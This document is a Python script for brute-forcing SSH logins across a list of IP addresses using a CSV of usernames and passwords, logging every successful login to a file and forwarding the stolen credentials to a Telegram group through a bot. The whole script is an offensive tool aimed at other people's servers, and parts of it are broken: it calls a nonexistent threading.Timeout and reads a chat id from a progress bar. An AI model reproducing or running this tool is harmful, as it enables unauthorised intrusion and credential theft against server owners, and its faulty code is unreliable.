import csv
import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
from tqdm import tqdm
import telebot
from termcolor import colored

# Initialize the Telegram bot
bot_token = 'YOUR_TELEGRAM_BOT_TOKEN'
bot = telebot.TeleBot(token=bot_token)

# Your group chat ID (where you want to send hits)
group_chat_id = -100123456789  # Replace with your group chat ID

# Define a set to store approved admin chat IDs
approved_admins = set()

# Global variables to keep track of counts
total_ips = 0
total_hits = 0
total_bad_live = 0
bot_enabled = True  # Enable or disable the bot

# Lock to protect shared counters
count_lock = threading.Lock()

# Timeout value (in seconds)
timeout_value = 10

# Function to send a message to the group
def send_to_group(message):
    bot.send_message(group_chat_id, message)

# Function to send a hit notification
def send_hit_notification(username, password, host):
    hit_message = f"🔥 Hit on host {host}:\nUsername - {username}\nPassword - {password} 🔐"
    send_to_group(hit_message)

# Handle the /start command to add admins
@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    if chat_id not in approved_admins:
        approved_admins.add(chat_id)
        bot.send_message(chat_id, "You are now an approved admin. You can manage the bot.")

# Function to get the CSV and IP file names from the user
def get_file_names():
    csv_file = input("Enter the name of the CSV password file (e.g., passwords.csv): ")
    ip_file = input("Enter the name of the IP text file (e.g., ips.txt): ")
    return csv_file, ip_file

# Colored and formatted output
def print_colored(message, color):
    print(colored(message, color))

# This function is responsible for the SSH client connecting.
def ssh_connect(host, username, password, pbar):
    global total_ips
    global total_hits
    global total_bad_live
    global bot_enabled

    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # Set a timeout for the connection attempt
        with threading.Timeout(timeout_value, exception=TimeoutError(f"Timeout connecting to {host}")):
            # We attempt to connect to the host, on port 22 which is SSH, with the given password and username.
            ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
            # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
            with open("credentials_found.txt", "a") as fh:
                # We write the credentials that worked to a file.
                message = f"🟢 Hit on host {host}:\nUsername - {username}\nPassword - {password} 🔐"
                print_colored(message, 'green')
                fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
                # Update the global hit count
                with count_lock:
                    total_hits += 1
                # Send a hit notification if the bot is enabled and the user is an approved admin
                if bot_enabled and pbar.chat.id in approved_admins:
                    send_hit_notification(username, password, host)
            # Once a valid password is found, exit the function
            return

    except AuthenticationException:
        # Bad credentials
        pass
    except TimeoutError:
        message = f"🔴 Timeout connecting to {host}"
        print_colored(message, 'red')
    except ssh_exception.SSHException:
        message = "🟡 Attempting to connect - Rate limiting on server"
        print_colored(message, 'yellow')
    except Exception as e:
        # Handle other exceptions
        pass

    # Update the global bad/live count
    with count_lock:
        total_bad_live += 1

    pbar.update(1)  # Update the progress bar

# This function gets a list of valid IP addresses from a file.
def get_ip_addresses(file_name):
    ip_addresses = []
    with open(file_name) as ip_file:
        for line in ip_file:
            line = line.strip()
            try:
                ipaddress.IPv4Address(line)
                ip_addresses.append(line)
            except ipaddress.AddressValueError:
                print(f"Skipping invalid IP address: {line}")
    return ip_addresses

# The program will start in the main function.
def main():
    global total_ips
    global total_hits
    global total_bad_live

    logging.getLogger('paramiko.transport').addHandler(NullHandler)
    num_threads = int(input("Enter the number of threads: "))
    csv_file, ip_file = get_file_names()
    ip_addresses = get_ip_addresses(ip_file)

    # Initialize the progress bar for IP addresses
    pbar_ip = tqdm(total=len(ip_addresses), desc="Total IPs Checked")

    for host in ip_addresses:
        total_ips += 1
        threads = []
        password_list = list(csv.reader(open(csv_file), delimiter=","))
        num_passwords = len(password_list) - 1  # Subtract 1 to exclude the header row

        # Initialize the progress bar for the password list
        pbar_password = tqdm(total=num_passwords, desc=f"IP: {host}")

        for index, row in enumerate(password_list):
            if index == 0:
                continue
            t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1], pbar_password))
            threads.append(t)
            t.start()
            time.sleep(0.2)

        # Wait for all threads to finish before moving on to the next IP address
        for t in threads:
            t.join()

        pbar_password.close()  # Close the password list progress bar

        # Update the progress bar for IP addresses
        pbar_ip.update(1)
        pbar_ip.set_postfix(Hits=total_hits, Bad_Live=total_bad_live)
        pbar_ip.refresh()

    pbar_ip.close()  # Close the IP address progress bar

if __name__ == "__main__":
    main()
    bot.polling(none_stop=True)
